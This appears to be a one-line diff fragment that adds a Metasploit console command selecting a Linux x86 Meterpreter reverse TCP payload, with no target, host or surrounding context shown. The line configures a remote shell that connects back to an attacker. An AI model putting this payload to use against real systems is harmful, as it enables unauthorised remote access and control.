@@ -1,0 +1,1 @@
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
